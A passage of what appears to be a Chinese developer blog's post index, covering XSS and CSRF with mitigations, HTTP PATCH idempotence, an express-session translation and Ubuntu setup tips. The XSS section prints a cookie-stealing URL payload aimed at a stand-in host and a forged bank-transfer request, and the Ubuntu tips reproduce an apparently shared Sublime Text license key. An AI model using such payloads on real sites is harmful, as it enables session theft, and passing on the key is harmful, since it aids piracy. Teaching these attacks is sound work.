定义\n\n基于 DOM 型 XSS 其实是一种特殊的反射型 XSS，反射型 XSS 的执行过程经过了服务器端（上面的例子中向服务器发了请求），而基于 DOM 的 XSS 没有经过服务器端（恶意代码没有流经服务端），直接通过 JavaScript（并非攻击者写的恶意脚本，而是来自服务器的 DOM 操作脚本）将数据输出到 HTML 页面中。\n\n#### 例子\n\n假设如下表单是让用户选择他的首选语言，默认选项作为参数提供在了 \"default\" 参数中。  \n\n```html\n<span>Select your language:</span>\n<select><script>\n  document.write('<OPTION value=1>' + document.location.href.substring( document.location.href.indexOf('efault=') + 8)+'</OPTION>');\n  document.write('<OPTION value=2>English</OPTION>');\n</script></select>\n```\n\n使用一下 URL 调用该页面  \n\n```html\nhttp://www.some.site/page.html?default=French\n```\n\n可以通过向受害者发送以下 URL 来完成基于 DOM 的 XSS 攻击\n\n```html\nhttp://www.some.site/page.html?default=<script>window.location='http://malicious.com/?data=' + document.cookie</script>\n```\n\n### 反射型和持久型区别\n\n最大的区别就是 XSS 恶意代码是否存储在合法服务器中，网友也有提到反射型需要欺骗用户点击链接，而持久型用户访问相关页面就直接触发。\n\n### 缓解办法\n\n根据攻击原理，可得出如下缓解办法（主要核心是第一条 —— **警惕用户输入**）：\n\n* **验证用户输入或者做内容转义**\n\n* 对于反射型，可以提醒用户小心恶意链接（这个几乎没用。。。）或者浏览器对 URL 做识别（Chrome，Firefox都支持）\n\n* 对于盗用 Cookie ，设置 HttpOnly 属性来保证 JavaScript 代码无法访问 cookie\n\n## XSS 延伸之 CSRF\n\n因为都是 Cross-Site，XSS 和 CSRF 有时候一起出现尽管他们并不相同，CSRF 是 Cross-Site Request Forgery (跨站请求伪造)，CSRF 攻击**通过伪装成受信任用户的请求来利用受信任的网站**，不管使用什么方法只要是伪造用户发起的请求都可以称为 CSRF 攻击。\n\n### 例子\n\n用户访问银行的网站，**在 Session 还未过期的情况下（伪造用户身份的关键）** ，访问了危险网站，危险网站执行如下代码\n\n```javascript\n$.post('/www.bank.com/transfer?amt=500&transferTo=B, function(data) { } );\n```\n\n这时候用户在不知情的情况下转账给了用户B 500元。  \n\n### 缓解办法\n\n不难看出，以上恶意网站发出的请求是跨域请求，在同源策略（Same Origin Policy）未被禁用时会被拦截，即使攻击者通过 iframe/form 来成功发送该请求（才知道表单允许跨域，因为无法获取表单提交后的结果），服务器端也可以**通过检查 Referer 来判断请求来源是否合法。**  \n但是，如果银行使用的是 GET 请求来完成转账操作，攻击者可以结合 XSS 来做到 CSRF 攻击，只需要借助以上 XSS 办法让用户点击请求的 URL 即可，这种情况下的 CSRF 又叫 XSRF。这种情况下**通过改良网站的 API 设计提高 CSRF 攻击的门槛。**   \n**对系统的关键操作添加验证码也是有效抵抗 CSRF 攻击的办法**，因为 \"CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求\" 。  \n不过针对 CSRF 最常用的方法还是使用 CSRF-Token ，通过在每次请求的请求头中添加 Token，服务器检查 Token 可以有效防止 CSRF 攻击。\n\n### CSRF 与 XSS 的区别\n\n一句话总结：**XSS 利用的是网站对用户（输入）的信任，CSRF 利用的是网站对用户网页浏览器的信任。**\n\n## 参考\n\n* <https://blog.sqreen.com/reflected-xss/>\n* <https://www.imperva.com/learn/application-security/reflected-xss-attacks/?utm_campaign=Incapsula-moved>\n* <https://www.owasp.org/index.php/DOM_Based_XSS>\n* <http://jartto.wang/2017/12/15/xss-and-csrf/>\n* <https://github.com/dwqs/blog/issues/68>\n* <https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/>\n* <https://juejin.im/post/5bc009996fb9a05d0a055192>","tags":["Web Security"]},{"title":"为什么 HTTP PATCH 方法不是幂等的及其延伸","url":"/2019/04/07/http-patch-idempotence/","content":"\n\n## 幂等性\n\n首先来看什么是幂等性，根据 [rfc2616(Hypertext Transfer Protocol -- HTTP/1.1)](https://www.ietf.org/rfc/rfc2616.txt) 文档第 50 页底部对 Idempotent Methods 的定义：  \n\n> Methods can also have the property of \"idempotence\" in that (aside from error or expiration issues) the side-effects of N > 0 identical requests is the same as for a single request. \n\n翻译过来也就是：**相同的请求执行多次和执行一次的副作用是一样的**。\n\n段落接下来就给出了具有幂等性的方法：\n\n> The methods GET, HEAD, PUT and DELETE share this property. Also, the methods OPTIONS and TRACE SHOULD NOT have side effects, and so are inherently idempotent.\n\n可以看出，`GET`，`HEAD`，`PUT`，`DELETE`，`OPTIONS` 和 `TRACE` 方法都是幂等的。\n\n## PUT 和 PATCH\n\n根据约定( Convention )，PUT 方法用于更新数据，PATCH 方法也用于更新数据，为什么 PUT 方法是幂等的而 PATCH 方法不是幂等的呢？我们继续研究文档（第54页）：  \n\n> The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.\n>\n> PUT 方法将请求所包含的实体存储在所提供的 Request-URI 下。如果该 URI 指代一个已经存在的资源，那么请求中的实体应该被视为保存在原服务器上的实体的修改版本。如果 Request-URI 没有指向一个现有资源，并且该 URI 可以被发送请求的用户代理定义为新资源，则原服务器可以使用该 URI 来创建资源。\n\n这里说的很明白了，PUT 用做更新操作的时候是提交一整个更新后的实体，而不是需要修改的实体中的部分属性。**当 URI 指向一个存在的资源，服务器要做的事就是查找并替换。**\n\n接下来看 [PATCH](<https://tools.ietf.org/html/rfc5789>)（PATCH 方法在原文档中没有找到相关描述，后来发现在另一个 RFC 里面 - `RFC5789`）:\n\n> The PATCH method requests that a set of changes described in the request entity be applied to the resource identified by the Request-URI.  The set of changes is represented in a format called a \"patch document\" identified by a media type.  If the Request-URI does not point to an existing resource, the server MAY create a new resource, depending on the patch document type (whether it can logically modify a null resource) and permissions, etc.\n>\n> PATCH 方法请求将一组描述在请求实体里的更改应用到 Request-URI 标志的资源。这组更改以称为 \"补丁文档\" 的格式（该格式由媒体类型标志）表示，如果 Request-URI 未指向现有资源，服务器可能根据补丁文档的类型（是否可以在逻辑上修改空资源）和权限等来创建一个新资源。\n\n所以可以知道 **PATCH 请求中的实体是一组将要应用到实体的更改，而不是像 PUT 请求那样是要替换旧资源的实体**，但是这并没有解决 PATCH 方法为什么不是幂等的问题。不着急，继续读，接下来就给出了 PUT 和 PATCH 的区别：\n\n> The difference between the PUT and PATCH requests is reflected in the way the server processes the enclosed entity to modify the resource identified by the Request-URI.  In a PUT request, the enclosed entity is considered to be a modified version of the resource stored on the origin server, and the client is requesting that the stored version be replaced.  With PATCH, however, the enclosed entity contains a set of instructions describing how a resource currently residing on the origin server should be modified to produce a new version.  The PATCH method affects the resource identified by the Request-URI, and it also MAY have side effects on other resources; i.e., new resources may be created, or existing ones modified, by the application of a PATCH.\n>\n> PUT 和 PATCH 请求的区别体现在服务器处理封闭实体以修改 Request-URI 标志的资源的方式。在一个 PUT 请求中，封闭实体被认为是存储在源服务器上的资源的修改版本，并且客户端正在请求替换存储的版本。而对于 PATCH 请求，封闭实体中包含了一组描述当前保留在源服务器上的资源应该如何被修改来产生一个新版本的指令。PATCH 方法影响由 Request-URI 标志的资源，而且它也可能对其他资源有副作用；也就是，通过使用 PATCH，新资源可能被创造，或者现有资源被修改。\n\n以上就是答案。可以理解为，**PATCH 请求中的实体保存的是修改资源的指令，该指令指导服务器来对资源做出修改**，所以不是幂等的。  \n可能有点抽象，打个比方：对于存在服务器中的 A 对象有个属性 B 为 1，如果要修改 B 属性为 3，则 PUT 请求是直接将修改过 B 属性的整个新对象发送给服务器查找并替换。而 PATCH 请求是在实体中包含指令 — 将 A 对象中 B 属性的值加 2，那么如果该请求被执行多次的话，B 属性就可能不为 3 了，而 PUT 请求不论执行多少次，B 属性永远都是 3，所以说 PUT 方法是幂等的，而 PATCH 方法不是幂等的。\n\n## PUT 和 POST\n\n在看请求相关的帖子的时候，偶尔也会看见争论说使用 PUT 来新增资源，使用 POST 来修改资源，或者说这两个方法差别不大，没必要这么明确分工。上文也提到了 PUT 方法的 URI 指向的资源不存在的时候也可以创建新资源。那到底怎么用，都写到这里了继续是用文档来说话，有关 POST 方法的说明：\n\n> **The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line.** POST is designed to allow a uniform method to cover the following functions:  \n>\n> - Annotation of existing resources;\n> - Posting a message to a bulletin board, newsgroup, mailing list or similar group of articles;\n> - Providing a block of data, such as the result of submitting a form, to a data-handling process;\n> - Extending a database through an append operation.\n>\n> The actual function performed by the POST method is determined by the server and is usually dependent on the Request-URI. The posted entity is subordinate to that URI in the same way that a file is subordinate to a directory containing it, a news article is subordinate to a newsgroup to which it is posted, or a record is subordinate to a database.\n>\n> **POST 方法用于请求源服务器接受请求中的实体作为 Request-URI 所标志的资源的新下级。** POST 方法旨在允许一个统一的方法来涵盖以下功能：\n>\n> - 现有资源的注释；\n> - 在公告栏，新闻组，邮件列表或类似文章组中发布消息;\n> - 提供数据块，例如提交表单的结果，数据处理过程;\n> - 通过追加操作扩展数据库。\n>\n> POST方法执行的实际功能由服务器确定，通常依赖于 Request-URI。 发布的实体从属于该 URI，其方式与文件从属于包含它的目录相同，新闻文章从属于发布它的新闻组，或者记录从属于数据库。\n\n加黑的第一句话是不是很熟悉，用 RESTful API 实现前后端交互接口的朋友看到这里应该就清楚了。这也是为什么 `POST /api/articles` 在 RESTful 中被建议用来创建文章而不是更新文章的原因。此外，POST 请求不是幂等的，以为着如果把它用来当作资源更新操作，会创造多个相同的资源，这是更新操作不希望产生的副作用，所以还是用 POST 新增资源，PUT 更新资源吧。\n\n当然，这些都是约定( convertion )  而不是规定( standard )，如果你就是喜欢用 PUT 新建资源，POST 来修改资源，那我只能说对不起让你花这么长时间看篇文章了，毕竟仅仅使用 GET 和 POST 完成所有操作还大有人在😄😄。","tags":["HTTP"]},{"title":"翻译 express-session 使用文档","url":"/2019/04/04/express-session-translate/","content":"> [文档原网址](https://www.npmjs.com/package/express-session)  \n\n以下翻译正文\n\n## Installation\n这是一个通过 [npm registry](https://www.npmjs.com/) 可用的 [Node.js](https://nodejs.org/en/) 模块。使用以下 `npm install` 命令来完成安装。\n```sh\n$ npm install express-session\n```\n## API\n\n```javascript\nvar session = require('express-session');\n```\n\n### sessions(options)\n使用给定选项创建一个 session 中间件。  \n**注意**：只有 session ID 是保存在 cookie 中，Session 数据本身并不是。Session 数据是存在服务端。  \n**注意**：从版本 1.5.0 起，本模块不再需要 [cookie-parser](https://www.npmjs.com/package/cookie-parser) 中间件来运行。本模块现在直接在 req/res 上读写 cookies。当本模块和 cookie-parser 的 `secret` 不一致时，使用 cookie-parser 可能会导致问题。  \n**警告**：默认的服务端 session 存储，MemoryStore，**特意**没有为生产环境而设计。在大多数情况下，它可能会导致内存泄漏，不会扩展过单个进程，而且是用于调试和开发。  \n对于存储列表，请查看[兼容的 session 存储](#compatible-session-stores)\n#### Options\nexpress-session 在 options 对象中接收以下参数：\n##### cookie\nsession ID cookie 的设置对象。默认值为 `{ path: '/', httpOnly: true, secure: false, maxAge: null }`.\n\n下列参数可选设置放入 cookie 对象。\n\n###### cookie.domain\n\n为 Set-Cookie 属性指定 domain。默认情况下，没有设置 domain，并且大多数客户端会将 cookie 视为仅应用于当前 domain。\n\n###### cookie.expires\n\n为 Set-Cookie 属性中的 Expires 指定 Date 对象。默认情况下，没有设置 expires，大多数客户端会将视这个为 \"非持久化 cookie\" 并且在像退出浏览器应用的场景下删除该 cookie。  \n**注意**：如果 options 对象中同时设置了 expires 和 maxAge，那么将被用到的是在对象中最后一个被定义的属性。  \n**注意**：expires 选项不应该被直接设置；而应该只使用 maxAge 选项。\n\n###### cookie.httpOnly\n\n为 Set-Cookie 属性中的 HttpOnly 指定 boolean 值。当为真值，HttpOnly 属性被设置，否则不被设置。默认情况下，HttpOnly 属性是被设置的。  \n**注意**：设置该值为 true 的时候要小心，因为服从协议的客户端不会允许 JavaScript 在 document.cookie 中查看 cookie。\n\n###### cookie.maxAge\n\n指定当计算 Set-Cookie 属性中的 Expires 时使用的 number （毫秒）值。这是通过获取当前服务器时间并将 maxAge 毫秒数加入其中计算 Expires 日期时间来完成的。默认情况下没有设置 maxAge。  \n**注意**：如果 options 对象中同时设置了 expires 和 maxAge，那么将被用到的是在对象中最后一个被定义的属性。\n\n###### cookie.path\n\n为 Set-Cookie 属性指定 Path 值。默认情况下该值被设为 `'/'`，也就是 domain 下的根路径。\n\n###### cookie.sameSite\n\n为 Set-Cookie 属性中的 SameSite 指定 boolean 或者 string 值。其中，\n\n* `true` 会将 SameSite 属性设为 Strict 以实现严格的相同站点强制。\n* `false` 不会 SameSite 属性。\n* `'lax'` 会将 SameSite 属性设置为 Lax 以实现宽松的相同站点强制。\n* `'strict'` 会将 SameSite 属性设置为 Strict 以实现严格的相同站点强制。\n\n关于不同的强制级别的更多信息可以在细则中找到<https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1.1>  \n**注意**：这是一个还未被完全标准化的属性并且将来可能发生变化。这意味着许多客户端可能忽略这条属性直到它们完全理解它为止。\n\n###### cookie.secure\n\n为 Set-Cookie 属性中的 Secure 指定 boolean 值。当为真时，Secure 属性被设置否则没有设置。默认情况下 Secure 属性没有被设置。  \n**注意**：当设置该值为 true 的时候请小心，因为如果浏览器没有建立 HTTPS 连接服从协议的客户端将不会发送 cookie 返回给服务端。  \n请注意 secure: true 是推荐选项。然而，它需要启用 HTTPS 的网站， 也就是 HTTPS  是 secure cookies 所必须的。如果 secure 被设置而你通过 HTTP 访问你的站点，cookie 将不会被设置。如果你在代理后使用 node.js 并且设置 secure: true，你需要在 express 中设置 \"trust proxy\"：\n\n```javascript\nvar app = express()\napp.set('trust proxy', 1) // trust first proxy\napp.use(session({\n  secret: 'keyboard cat',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: true }\n}))\n```\n\n为了在生产环境中使用 secure cookies，同时允许在开发环境中测试，下列是在 express 中基于 `NODE_ENV` 启用此设置的示例：\n\n```javascript\nvar app = express()\nvar sess = {\n  secret: 'keyboard cat',\n  cookie: {}\n}\n \nif (app.get('env') === 'production') {\n  app.set('trust proxy', 1) // trust first proxy\n  sess.cookie.secure = true // serve secure cookies\n}\n \napp.use(session(sess))\n```\n\ncookie.secure 选项也可以被设置成特殊值 \"auto\" 来让这个设置自动和确定的连接的安全性相匹配。如果站点可以同时用做 HTTP 和 HTTPS 请小心使用这个设置，因为一旦 cookie 的 HTTPS 属性被设置，cookie 不会再对 HTTP 可见。当 Express 的 \"trust proxy\" 被正确设置来简化开发和生产配置的时候，这非常有用。\n\n##### genid\n\n调用来生成一个新的 session ID 的函数。提供一个返回 string 类型并将被用来作为 session ID 的函数。当生成 ID 的时候如果你想用一些附加到 req 的值，该函数已给定 req 作为第一个参数。  \n默认值是一个使用 `uid-safe` 库来生成 ID 的函数。  \n**注意**：请小心生成唯一的 ID 以便你的 sessions 不会产生冲突。\n\n```javascript\napp.use(session({\n  genid: function(req) {\n    return genuuid() // use UUIDs for session IDs\n  },\n  secret: 'keyboard cat'\n}))\n```\n\n##### name\n\n设置在 response 中（和从 request 中读取）的 session ID 的 cookie 的 name。  \n默认值为 `\"connect.sid\"`。  \n**注意**：如果你有多个运行在相同 hostname（只是名字，也就是 localhost 或者 127.0.0.1；不同的协议(scheme) 和 端口(port) 不命名不同的主机名）上的应用，那么你需要将 session cookie 彼此分开。最简单的方法是每个应用设置不同的 name。\n\n##### proxy\n\n当设置 secure cookies 的时候相信反向代理（通过 `\"X-Forwarded-Proto\"` 头）。  \n默认值为 `undefined`。  \n* `true` 表示 `\"X-Forwarded-Proto\"` 头将会被使用。\n* `false` 表示只有存在直接的 TLS/SSL 连接时才会忽略所有头并认为连接是安全的。\n* `undefined` 表示从 express 中使用 \"trust proxy\"。\n\n##### resave\n\n及时回话在请求期间从未被修改过也强制 session 保存回 session 存储。根据你的存储这可能是必须的，但是这也可能创造竞争条件当客户端发送两个并行请求到你的服务端并且其中一个请求A 对 session 作出的更改可能会在另一个请求 B 结束时被覆盖即使请求 B 没有做任何更改（这个行为取决于你用的 session 存储）。  \n默认值为 true，但是不推荐使用默认值，因为默认值将来会被更改。请研究此项设置并选择适合你的用例的选项。一般来讲，你会想选择 false。  \n我怎么知道该设置对我的 session 存储来讲是不是必须的呢？最好的方法是检查你的存储看它是否实现了 touch 方法。如果它实现了，那你可以安全地设置 resave 为 false。如果它没有实现 touch 方法而且你的 store 在存储的 sessions 中设定的 expiration 日期，那么你可能需要设置 resave: false。\n\n##### rolling\n\n强制在每次响应的时候设置一个 session 标志符 cookie。expiration 重新被设置为初始的 maxAge，重置 expiration 倒计时。  \n默认值为 false。  \n**注意**：当该选项被设置为 true 但是 saveUninitialized 选项被设置为 false，则不会在具有未初始化的 session 响应中设置 cookie。\n\n##### saveUninitialized\n\n强制将未初始化的 session 保存回 store。当一个 session 是新的但是还未被修改时我们说他是未初始化的。选择 false 值对实现登录 session 是有用的，因为它减少了服务器存储的用量，遵守了设置 cookie 前需要许可的规则。选择 false 值也有助于客户端在没有回话的情况下发出过个并行请求的竞争条件。  \n默认值为 true，但是不推荐使用默认值，因为默认值将来会被更改。请研究此项设置并选择适合你的用例的选项。  \n**注意**：如果你正在结合 PassportJS 使用 Session，用户通过身份验证后PassportJS 将为该用户在 session 中添加一个空的 Passport 对象，这将会视为对 session 的修改，导致 session 被保存。*这已经在 PassportJS 0.3.0 中被修复。*\n\n##### secret\n\n**必设选项**  \n这是用来给 session ID cookie 签名的 secret。这可以是单个 secret 的字符串也可以是多个 secret 组成的数组。如果提供了一组 secrets，只有第一个元素会被用来给 session ID cookie 签名，在验证请求签名的时候才会考虑到所有元素。\n\n##### store\n\nsession 存储实例，默认为一个新的 MemoryStore 实例。\n\n##### unset\n\n控制取消设置 req.session 的结果（通过删除，设为 null，等等）。  \n默认值为 **'keep'**  \n* `'destroy'` 表示当响应结束的时候 session 将会被销毁（删除）。\n* `'keep'` 表示在 store 中的 session 会被保留，但是在请求期间做的修改将会被忽略不会被保存。\n\n### req.session\n\n存储或者访问 session 数据，只需要使用请求属性 req.session，该属性（通常）由 store 序列化为 session，所以一般来说嵌套对象也可以接受。下面的示例是一个基于特定用户的视图计数器：\n\n```javascript\n// Use the session middleware\napp.use(session({ secret: 'keyboard cat', cookie: { maxAge: 60000 }}))\n \n// Access the session as req.session\napp.get('/', function(req, res, next) {\n  if (req.session.views) {\n    req.session.views++\n    res.setHeader('Content-Type', 'text/html')\n    res.write('<p>views: ' + req.session.views + '</p>')\n    res.write('<p>expires in: ' + (req.session.cookie.maxAge / 1000) + 's</p>')\n    res.end()\n  } else {\n    req.session.views = 1\n    res.end('welcome to the session demo. refresh!')\n  }\n})\n```\n\n#### Session.regenerate(callback)\n\n要重新生成 session 只需要调用这个方法。完成后一个新的 SID 和 Session 实例将会被初始化在 req.session 并且 callback 会被调用。\n\n```javascript\nreq.session.regenerate(function(err) {\n  // will have a new session here\n})\n```\n\n#### Session.destroy(callback)  \n销毁 Session 并取消设置 req.session 属性。完成后将调用 callback。  \n```javascript\nreq.session.destroy(function(err) {\n  // cannot access session here\n})\n```\n\n#### Session.reload(callback)\n\n从 store 重新载入 session 数据并重新填充 req.session 对象。完成后将调用 callback。\n\n```javascript\nreq.session.reload(function(err) {\n  // session updated\n})\n```\n\n#### Session.save(callback)\n\n将 session 保存回 store，用内存中的内容替换 store 中的内容（尽管 store 可能还会做其他的事情—参阅 store 的文档以了解其确切的行为）。  \n如果 session 数据被改变了这个方法会在 HTTP 响应的末尾自动被调用（尽管这个行为可以被中间件构造器中的多种选项所改变）。因此，一般来讲这个方法不需要被手动调用。  \n存在一些调用这个方法会很有用的情况，比如重定向，长期请求（long-lived requests）或着 WebSockets。\n\n```javascript\nreq.session.save(function(err) {\n  // session saved\n})\n```\n\n#### Session.touch(callback)\n\n更新 .maxAge 属性。一般来讲这个方法不需要被调用因为 session 中间件为你执行了这个操作。\n\n### req.session.id\n\n每一个 session 都有一个与之关联的唯一 ID。该属性是 req.sessionID 的别名而且无法修改。该属性已被添加以使 session ID 可以从 session 对象中访问。\n\n### req.session.cookie\n\n每一个 session 都有一个唯一的 cookie 与之伴随。这允许你更改每个访问者的 session cookie。例如我们可以设置 req.session.cookie.expires 为 false 来使 cookie 仅在用户-代理的持续时间中保留。\n\n#### Cookie.maxAge\n\nreq.session.cookie.maxAge 将以毫秒数返回剩余的时间，我们也可以重新分配一个新值来适当地调整 .expires 属性。以下代码是等效的：\n\n```javascript\nvar hour = 3600000\nreq.session.cookie.expires = new Date(Date.now() + hour)\nreq.session.cookie.maxAge = hour\n```\n\n例如当 maxAge 被设置为 60000（一分钟）时，三十秒后它将返回 30000 知道当前的请求已完成，此时调用 req.session.touch() 将会重设 req.session.maxAge 为它的初始值。\n\n```javascript\nreq.session.cookie.maxAge // => 30000\n```\n\n### req.sessionID\n\n要拿到载入的 session 的 ID，访问请求的属性 req.sessionID。当 session 被载入或被创建的时候这仅是一个只读的值。\n\n## Session Store Implementation\n\n每一个 session store 必须是一个 EventEmitter 并且实现特定的方法。下列的方法是必需，推荐和可选的列表。\n\n* 必需的方法是此模块将会始终在 store 中调用的方法。\n* 推荐的方法是如果可用此模块将会在 store 中调用的方法。\n* 可选的方法是此模块根本不会调用的方法\n\n有关示例实现请查看 [connect-redis](http://github.com/visionmedia/connect-redis) 仓库。\n\n### store.all(callback)\n\n**可选**  \n该可选方法用于以数组形式获取 store 中的所有 session。回调方法应该使用为 `callback(error, sessions)`。\n\n### store.destroy(sid, callback)\n\n**必需**  \n该必需方法根据给定的 session ID 来销毁（删除）store 中的 session。session被删除后回调函数应该使用为 `callback(error)`。\n\n### store.clear(callback)\n\n**可选**  \n该可选方法用于删除 store 中的所有 session。store 清空后回调函数应该使用为 `callback(error)`。\n\n### store.length(callback)\n\n**可选**  \n该可选方法用于获取 store 中所有 session 的个数。回调函数应该使用为 `callback(error, len)`。\n\n### store.get(sid, callback)\n\n**必需**  \n该必需方法根据给定的 session ID 从 store 中获取 session。回调函数应该使用为 `callback(error, session)`。  \n如果找到 session 回调函数中的 session 参数应该为一个 session 对象，否则如果没有找到 session（并且也没有错误）应该为 null 或 undefined。当 `error.code === 'ENOENT'` 表现为 `callback(null, null)` ，这是一种特殊情况。\n\n### store.set(sid, session, callback)\n\n**必需**  \n该必需方法根据给定的 session ID 和 session 对象将 session 存入 store。session 存入 store 后回调函数应该使用为 `callback(error)`。\n\n### store.touch(sid, session, callback)\n\n**推荐**  \n该推荐方法根据给定的 session ID 和 session 对象 \"触碰\" 给定的 session 对象。session 被 \"触碰\" 后回调函数应该使用为 `callback(error)`。  \n该方法主要用于 store 自动删除空闲 session，并将此方法用于向 store 发送给定 session 处于活动状态的信号，可能回重置空闲计时器。  \n## Compatible Session Stores\n\n下列的模块是实现了一个和本模块兼容的 session store。请提出 PULL REQUEST 来添加其他的模块 :)  \n本处仅列出两处 store 实现，更多请查看[原文档](https://www.npmjs.com/package/express-session#compatible-session-stores)  \n[`connect-db2`](https://www.npmjs.com/package/connect-db2): 一个使用 ibm_db 模块建成的基于 IBM DB2 的 session store。  \n[`connect-mongo`](https://www.npmjs.com/package/connect-mongo): 一个基于 SQL Server 的 session store。\n\n## Example\n\n一个简单使用 express-session 来为用户存储页面访问的例子：\n\n```javascript\nvar express = require('express')\nvar parseurl = require('parseurl')\nvar session = require('express-session')\n \nvar app = express()\n \napp.use(session({\n  secret: 'keyboard cat',\n  resave: false,\n  saveUninitialized: true\n}))\n \napp.use(function (req, res, next) {\n  if (!req.session.views) {\n    req.session.views = {}\n  }\n \n  // get the url pathname\n  var pathname = parseurl(req).pathname\n \n  // count the views\n  req.session.views[pathname] = (req.session.views[pathname] || 0) + 1\n \n  next()\n})\n \napp.get('/foo', function (req, res, next) {\n  res.send('you viewed this page ' + req.session.views['/foo'] + ' times')\n})\n \napp.get('/bar', function (req, res, next) {\n  res.send('you viewed this page ' + req.session.views['/bar'] + ' times')\n})\n```\n\n## License\n\n[MIT](https://github.com/expressjs/session/blob/HEAD/LICENSE)\n\n## Keywords\n\nnone","tags":["express-session"]},{"title":"Ubuntu16.04 个性化","url":"/2018/03/27/ubuntu-tips/","content":"\n\n::: info\n\nLast Updated on 2018/04/09\n\n:::\n\n这是安装完 ubuntu16.04 后，自己的一些个性化，还有一些我个人需要安装的软件。因为是写给自己用的，所以有些地方没有写那么仔细。\n\n#### 删除自带软件\n\n1. 删除 libreoffice  \n   `sudo apt remove libreoffice?`\n2. 删除 amazon 链接  \n   `sudo apt remove unity-webapps-common`\n3. 删除其他自带软件  \n   `sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  landscape-client-ui-install onboard deja-dup`\n   <!-- more -->\n\n#### 命令行安装一些程序\n\n- 安装 vim  \n  `sudo apt install vim`\n- 安装 git  \n  `sudo apt install git`，安装完记得配置\n\n``` sh\ngit config --global user.name \"yourname\"\ngit config --global user.email \"youremail@example.com\"\n```\n\n- 安装压缩和解压  \n  1. 压缩功能  \n     安装 `sudo apt-get install rar`  \n     卸载 `sudo apt-get remove rar`  \n  2. 解压功能  \n     安装 `sudo apt-get install unrar`  \n     卸载 `sudo apt-get remove unrar`  \n  3. 使用压缩和解压缩.rar  \n     解压：`rar x FileName.rar`  \n     压缩：`rar a FileName.rar DirName`\n\n#### 安装 zsh 和 oh-my-zsh\n\n- 安装 zsh\n  `sudo apt install zsh`  \n- 下载 oh-my-zsh 来配置 zsh\n  `wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh`  \n  或者  \n  `sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"`  \n- 设置 zsh 为默认 shell\n  `chsh -s /bin/zsh`\n\n#### 安装扁平化主题\n\n- 安装扁平化主题\n\n```\nsudo add-apt-repository ppa:noobslab/themes\nsudo apt-get update\nsudo apt-get install flatabulous-theme\n```\n\n- 安装配套图标\n\n```\nsudo add-apt-repository ppa:noobslab/icons\nsudo apt-get update\nsudo apt-get install ultra-flat-icons\n```\n\n- 使用 unity-tweak-tool 修改主题和图标\n\n#### 安装顶栏网速显示插件\n\n```\nsudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor  \nsudo apt-get update\nsudo apt-get install indicator-sysmonitor\nindicator-sysmonitor &\n然后Ctrl+C就可以实现后台运行indicator-sysmonitor\n```\n\n#### 安装 syspeek\n\n```\nsudo add-apt-repository ppa:nilarimogard/webupd8    \nsudo apt-get update    \nsudo apt-get install syspeek\n```\n\n#### 安装 Flash 插件\n\n进入系统设置 --> 软件与更新 --> 其他软件 --> 勾上Canonical合作伙伴 --> 确定  \n进入终端：`apt-get install adobe-flashplugin`\n\n#### 安装为知笔记\n\n```\nsudo add-apt-repository ppa:wiznote-team\nsudo apt-get update\nsudo apt-get install wiznote\n```\n\n#### 安装remarkable markdown编辑器\n\n下载安装包\nhttp://remarkableapp.github.io/linux/download.html\n\n- `dpkg -i remarkable_1.62_all.deb`\n- `sudo apt-get install -f`\n  如果报警说少了 gtkspellcheck：  \n  `sudo apt-get install python3-gtkspellcheck`\n\n#### 安装 Sublime Text 3\n\n```\nsudo add-apt-repository ppa:webupd8team/sublime-text-3  \nsudo apt-get update  \nsudo apt-get install sublime-text-installer\n```\n\n装完了以后可以激活它，在Help里输入license key\n\n```\n—– BEGIN LICENSE —–\nMichael Barnes\nSingle User License\nEA7E-821385\n8A353C41 872A0D5C DF9B2950 AFF6F667\nC458EA6D 8EA3C286 98D1D650 131A97AB\nAA919AEC EF20E143 B361B1E7 4C8B7F04\nB085E65E 2F5F5360 8489D422 FB8FC1AA\n93F6323C FD7F7544 3F39C318 D95E6480\nFCCC7561 8A4A1741 68FA4223 ADCEDE07\n200C25BE DBBC4855 C4CFB774 C5EC138C\n0FEC1CEF D9DCECEC D3A5DAD1 01316C36\n—— END LICENSE ——\n```\n\ncontrol+shift+p安装package control\n\n#### 安装 Atom 编辑器\n\n```\nsudo add-apt-repository ppa:webupd8team/atom  \nsudo apt-get update  \nsudo apt-get install atom\n```\n\n#### 关于提示 “当前网络有local域”\n\n修改/etc/default/avahi-daemon 中参数  \nAVAHI_DAEMON_DETECT_LOCAL=0\n\n#### “此软件来自第三方且可能包含非自由组件” 的问题\n\nUbuntu16.04 LTS安装第三方软件 `*.deb` 时， 提示此软件来自第三方且可能包含非自由组件的在Ubuntu软件中心安装GDebi，然后右键单击 `*.deb` 安装包，打开方式选择”GDebi包安装程序”，最后在机器上 sudo apt install `*.deb` 就ok\n\n#### 火狐浏览器设置对所有页面缩放\n\n1. 地址栏输入 about:config\n2. 找 layout.css.devPixelsPerPs\n3. 修改数值 1.25，意思就是 125%\n\n#### 设置外置磁盘开机自动挂载\n\n1. `sudo blkid` 查看磁盘分区 UUID\n2. `vim /etc/fstab` i 进入编辑模式\n3. 最后一行添加 `UUID=xxxxx  挂载点 ext4 auto 0 0`\n\n#### 设置启动器位置\n\n启动器位于下方\n`gsettings set com.canonical.Unity.Launcher launcher-position Bottom`  \n启动器位于左侧\n`gsettings set com.canonical.Unity.Launcher launcher-position Left`\n\n#### 禁用客人会话\n\n`sudo gedit /etc/lightdm/lightdm.conf`  \n添加如下代码，然后保持重启电脑即可。\n\n```\n[SeatDefaults]\ngreeter-session=unity-greeter\nallow-guest=false\n```\n\n#### ibus 拼音输入法\n\n安装：`sudo apt-get install ibus-pinyin`  \n无法正常输入：`ibus-daemon -drx`\n\n#### 安装 WPS 后字体缺失\n\n1. 